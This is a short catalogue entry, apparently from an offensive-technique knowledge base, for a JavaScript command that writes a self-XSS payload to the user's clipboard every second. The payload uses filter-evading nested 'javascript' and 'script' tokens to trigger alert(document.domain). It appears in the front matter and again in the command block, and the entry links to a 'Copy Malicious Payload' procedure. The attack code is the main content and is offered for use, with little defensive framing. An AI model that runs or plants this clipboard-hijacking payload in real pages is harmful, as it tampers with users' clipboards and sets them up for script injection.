---
id: cmd-clipboard-write-interval
data: >-
  setInterval(function(){ navigator.clipboard.writeText("<<!<script>iframe
  src=javajavascriptscript:alert(document.domain)>").then(function(text){console.log(text)})
  },1000)
tags:
  - clipboard-write
  - payload
type: command
output: Console log of payload; clipboard updated
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:13.019Z'
verified: false
validated: true
submitted: true
---
# SetInterval Write Clipboard Payload

## Command

```javascript
setInterval(function(){ navigator.clipboard.writeText("<<!<script>iframe src=javajavascriptscript:alert(document.domain)>").then(function(text){console.log(text)}) },1000)
```

## Description

Writes self-XSS payload to clipboard every second, logs success.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| payload | Text to write | Yes |

## Examples

### Basic Usage

```javascript
// As above
```

## Expected Output

Payload logged; permission required.

## Related

- [[Related Procedure: Copy Malicious Payload]]
